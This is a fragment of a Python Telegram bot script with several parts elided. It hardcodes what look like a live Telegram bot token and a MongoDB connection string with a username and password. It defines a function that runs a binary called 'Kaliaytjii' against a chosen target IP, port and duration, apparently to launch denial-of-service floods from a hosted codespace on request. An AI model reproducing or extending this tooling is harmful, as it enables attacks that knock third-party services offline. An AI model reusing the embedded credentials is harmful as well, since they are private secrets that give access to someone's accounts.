...
TOKEN = '7838040456:AAFJth5E3aarQQSgHrxXDLfNudMG1p23BXo'
MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
FORWARD_CHANNEL_ID = -1002401717431
CHANNEL_ID = -1002401717431
error_channel_id = -1002401717431
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./Kaliaytjii {target_ip} {target_port} {duration}"
    try:
...
if __name__ == "__main__":
    ...
    logging.info("Kaliaytjii SERVER RUNNING.....")
    while True:
        try:
